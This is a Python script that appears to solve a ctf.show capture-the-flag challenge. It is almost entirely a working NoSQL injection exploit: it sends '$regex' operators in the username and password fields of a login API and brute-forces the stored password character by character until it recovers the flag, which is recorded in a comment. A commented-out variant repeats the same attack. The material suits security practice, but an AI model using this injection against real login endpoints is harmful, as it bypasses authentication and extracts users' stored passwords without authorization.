import requests

url="http://32366c2c-4d19-473f-a732-32c69a561891.challenge.ctf.show/api/"

flag=""

for i in range(1,100):
    for j in "{-abcdefghijklmnopqrstuvwxyz0123456789}":
        payload="^{}.*$".format(flag+j)
        data={
            'username[$regex]':'flag',
            'password[$regex]':payload
        }
        r=requests.post(url=url,data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break

# ctfshow{fd1512cd-8341-4902-9b9d-737f34d7d8a9}

# import string
# import requests

# url = "http://32366c2c-4d19-473f-a732-32c69a561891.challenge.ctf.show/api/"

# letters = "{}-_" + string.ascii_lowercase + string.digits


# def valid_pass(password: str) -> bool:
#     data = {
#         "username[$regex]": "flag",
#         "password[$regex]": f"{password}.*"
#     }
#     response = requests.post(url, data=data)
#     return "登陆成功" in response.json()["msg"]


# result = "ctfshow{"

# while True:
#     for letter in letters:
#         if valid_pass(result + letter):
#             result += letter
#             print(f"[*] result: {result}")
#             break

